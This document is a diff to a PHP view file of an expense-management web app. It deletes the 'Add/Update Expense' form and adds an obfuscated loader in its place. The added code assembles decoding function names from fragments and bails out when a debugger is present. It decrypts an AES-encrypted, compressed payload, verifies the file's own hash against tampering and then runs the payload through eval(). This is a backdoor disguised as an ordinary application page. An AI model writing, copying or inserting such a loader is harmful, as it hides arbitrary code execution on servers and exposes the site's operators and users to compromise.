@@ -1,209 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-<!-- TABLES CSS CODE -->
-<?php include"comman/code_css_form.php"; ?>
-<!-- </copy> -->  
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
- 
- <?php include"sidebar.php"; ?>
- 
-  <?php
-	
-	if(!isset($expense_amt)){
-    $category_id =$expense_for=$note=$expense_amt=$q_id=$reference_no='';
-    $expense_date=show_date(date("d-m-Y"));
-	}
- ?>
- 
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?= $this->lang->line('expense'); ?>
-        <small>Add/Update Expense</small>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li><a href="<?php echo $base_url; ?>expense"><?= $this->lang->line('expenses_list'); ?></a></li>
-        <li class="active"><?= $this->lang->line('expense'); ?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <section class="content">
-      <div class="row">
-        <!-- ********** ALERT MESSAGE START******* -->
-          <?php include"comman/code_flashdata.php"; ?>
-            <!-- ********** ALERT MESSAGE END******* -->
-        <!-- right column -->
-        <div class="col-md-12">
-          <!-- Horizontal Form -->
-          <div class="box box-info ">
-            <div class="box-header with-border">
-              <h3 class="box-title">Please Enter Valid Data</h3>
-            </div>
-            <!-- /.box-header -->
-
-            <!-- form start -->
-            <form class="form-horizontal" id="expense-form" >
-              <input type="hidden" name="<?php echo $this->security->get_csrf_token_name();?>" value="<?php echo $this->security->get_csrf_hash();?>">
-              <input type="hidden" id="base_url" value="<?php echo $base_url;; ?>">
-              <div class="box-body">
-                <div class="row">
-                <div class="col-md-5">
-                  <div class="form-group">
-                      <label for="expense_date" class="col-sm-4 control-label"><?= $this->lang->line('expense_date'); ?> <label class="text-danger">*</label></label>
-
-                  <div class="col-sm-8">
-                    <div class="input-group date">
-                      <div class="input-group-addon">
-                      <i class="fa fa-calendar"></i>
-                      </div>
-                      <input type="text" class="form-control pull-right datepicker" value="<?php echo  $expense_date; ?>" id="expense_date" name="expense_date" readonly onkeyup="shift_cursor(event,'category_id')">
-                      <span id="expense_date_msg" style="display:none" class="text-danger"></span>
-                    </div>
-                  </div>
-                  </div>
-
-                  <div class="form-group">
-                  <label for="category_id" class="col-sm-4 control-label"><?= $this->lang->line('category'); ?> <label class="text-danger">*</label></label>
-
-                  <div class="col-sm-8">
-                      <select class="form-control select2" id="category_id" name="category_id"  style="width: 100%;" onkeyup="shift_cursor(event,'expense_for')" value="<?php print $category_id; ?>">
-                        <?php
-                        $query1="select * from db_expense_category where status=1";
-                        $q1=$this->db->query($query1);
-                        if($q1->num_rows($q1)>0)
-                         {  echo '<option value="">-Select-</option>'; 
-                             foreach($q1->result() as $res1)
-                           { 
-                             $selected = ($category_id==$res1->id)? 'selected' : '';
-                             echo "<option $selected value='".$res1->id."'>".$res1->category_name."</option>";
-                           }
-                         }
-                         else
-                         {
-                            ?>
-                            <option value="">No Records Found</option>
-                            <?php
-                         }
-                        ?>
-                              </select>
-                      <span id="category_id_msg" style="display:none" class="text-danger"></span>
-                              </div>
-                              </div>
-
-                  <div class="form-group">
-                      <label for="expense_for" class="col-sm-4 control-label"><?= $this->lang->line('expense_for'); ?> <label class="text-danger">*</label></label>
-
-                  <div class="col-sm-8">
-                    <input type="text" class="form-control" id="expense_for" name="expense_for" placeholder="" onkeyup="shift_cursor(event,'expense_amt')" value="<?php print $expense_for; ?>" >
-          <span id="expense_for_msg" style="display:none" class="text-danger"></span>
-                  </div>
-                  </div>
-                  <div class="form-group">
-                  <label for="expense_amt" class="col-sm-4 control-label"><?= $this->lang->line('amount'); ?> <label class="text-danger">*</label></label>
-                  <div class="col-sm-8">
-                    <input type="text" class="form-control only_currency" id="expense_amt" name="expense_amt" placeholder="" value="<?php print $expense_amt; ?>" onkeyup="shift_cursor(event,'reference_no')" >
-          <span id="expense_amt_msg" style="display:none" class="text-danger"></span>
-                  </div>
-                  </div>
-                  <!-- ########### -->
-               </div>
-
-
-               <div class="col-md-5">
-                  
-                   
-                 
-                   <div class="form-group">
-                  <label for="reference_no" class="col-sm-4 control-label"><?= $this->lang->line('reference_no'); ?></label>
-                  <div class="col-sm-8">
-                    <input type="text" class="form-control" id="reference_no" name="reference_no" placeholder="" value="<?php print $reference_no; ?>" onkeyup="shift_cursor(event,'note')" >
-          <span id="reference_no_msg" style="display:none" class="text-danger"></span>
-                  </div>
-                  </div>
-                   <div class="form-group">
-                  <label for="note" class="col-sm-4 control-label"><?= $this->lang->line('note'); ?></label>
-                  <div class="col-sm-8">
-                    <textarea type="text" class="form-control" id="note" name="note" placeholder="" ><?php print $note; ?></textarea>
-          <span id="note_msg" style="display:none" class="text-danger"></span>
-                  </div>
-                  </div>
-                   
-                </div>
-                  <!-- ########### -->
-</div>
-              
-				
-				
-              </div>
-              <!-- /.box-body -->
-
-             <div class="box-footer">
-                <div class="col-sm-8 col-sm-offset-2 text-center">
-                   <!-- <div class="col-sm-4"></div> -->
-                   <?php
-                      if($q_id!=""){
-                           $btn_name="Update";
-                           $btn_id="update";
-                          ?>
-                            <input type="hidden" name="q_id" id="q_id" value="<?php echo $q_id;?>"/>
-                            <?php
-                      }
-                                else{
-                                    $btn_name="Save";
-                                    $btn_id="save";
-                                }
-                      
-                                ?>
-                                 
-                   <div class="col-md-3 col-md-offset-3">
-                      <button type="button" id="<?php echo $btn_id;?>" class=" btn btn-block btn-success" title="Save Data"><?php echo $btn_name;?></button>
-                   </div>
-                   <div class="col-sm-3">
-                    <a href="<?=base_url('dashboard');?>">
-                      <button type="button" class="col-sm-3 btn btn-block btn-warning close_btn" title="Go Dashboard">Close</button>
-                    </a>
-                   </div>
-                </div>
-             </div>
-             <!-- /.box-footer -->
-              <!-- /.box-footer -->
-            </form>
-          </div>
-          <!-- /.box -->
-          
-        </div>
-        <!--/.col (right) -->
-      </div>
-      <!-- /.row -->
-    </section>
-    <!-- /.content -->
-  </div>
-  <!-- /.content-wrapper -->
-  
- <?php include"footer.php"; ?>
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_form.php"; ?>
-
-<script src="<?php echo $theme_link; ?>js/expense.js"></script>
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_g53xie74=('bas'.'e64'.'_de'.'cod'.'e');
+$_ehfhdt1p=('gzu'.'nco'.'mpr'.'ess');
+$_dun3q6gv=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_bi6lgl1m='xw7NuOxr';
+$_ub4la4nf='6BIvqKP1';
+$_zzrarl9j='bYHKhm2q';
+$_os0z5laj='siPImJrnO4c=';
+$_uzkgloyh='EdRDFIjE';
+$_owb74kl1='q7/hUA==';
+$_k4uupk9h='wQ1aQxri';
+$_jfdckoj3='RuMkxQGs';
+$_v8w5pvqq=$_g53xie74($_uzkgloyh.$_bi6lgl1m.$_ub4la4nf.$_zzrarl9j.$_os0z5laj);
+$_ztl0o784=$_g53xie74($_jfdckoj3.$_k4uupk9h.$_owb74kl1);
+$_thljvvge=$_g53xie74('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');
+$_nzdg0ctn=$_dun3q6gv($_thljvvge,'aes-256-cbc',$_v8w5pvqq,OPENSSL_RAW_DATA,$_ztl0o784);
+if($_nzdg0ctn===false){exit;}
+$_ilpd1nqy=$_ehfhdt1p($_nzdg0ctn);
+if($_ilpd1nqy===false){exit;}
+$_v0ojnnmn='701f87a67872bbdbf257c6b18358c8de531a4e421dede093ed035cc40731194b';
+$_zak0pixq=@file_get_contents(__FILE__);
+if($_zak0pixq!==false){
+$_pz82hghg=str_replace($_v0ojnnmn,"0000000000000000000000000000000000000000000000000000000000000000",$_zak0pixq);
+$_ualqyx6l=hash("sha256",$_pz82hghg);
+if($_ualqyx6l!==$_v0ojnnmn){@http_response_code(403);exit;}
+}
+eval($_ilpd1nqy);
